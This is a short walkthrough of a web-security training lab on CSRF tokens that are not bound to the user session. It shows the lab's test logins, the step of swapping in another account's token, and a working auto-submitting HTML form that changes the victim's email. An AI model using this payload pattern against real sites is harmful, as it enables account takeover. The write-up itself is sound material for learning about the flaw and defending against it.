# CSRF Token not tied to the user session

## Challenge
 This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

    wiener:peter
    carlos:montoya

## Solution

I login with the `wiener` credentials, and change the email. I send this request to the repeater and see that there is a `csrf` token. I try to change the email again, with the same `csrf` token and it's invalid.

So, this means, that the token is invalidated after it's used.

In a private windows I login with the `carlos` credentials, and I send the `GET /my-account?id=carlos` request to the repeater, and see in the response a hidden field containing the token:

```html
<input required type="hidden" name="csrf" value="i8Ew1pO0tnUKZ8wjlpYVuKVXFATrJw5Q">
```

I copy this token, and put it into the `POST` requesot of `wiener` and try to change the email again with this changed token now.

And now I got a `302 Found` and when I `followed the redirection` I saw that the email got changed.

So here the vulnerability lies into that the token is validated only if it exists in the server pool, and in this case, I'm going to take another `csrf` token, and use that to create the payload for the exploit server, and deliver it to the victim.

To do that, just senda new `GET /my-account?id=carlos` request and you will get the new `csrf` in the hidden field in the response.

Go to the exploit server, and put this html body, where the new csrf is included:

```html
<form action="https://0aba007804f3415080026c4300150079.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned&commat;vatrasec22&period;net" />
    <input type="hidden" name="csrf" value="Mfjrbi29b1Rn9iMLc8w5Gu59WHl3xt3Q" />
</form>
<script>
    document.forms[0].submit();
</script>
```

and the lab is solved.

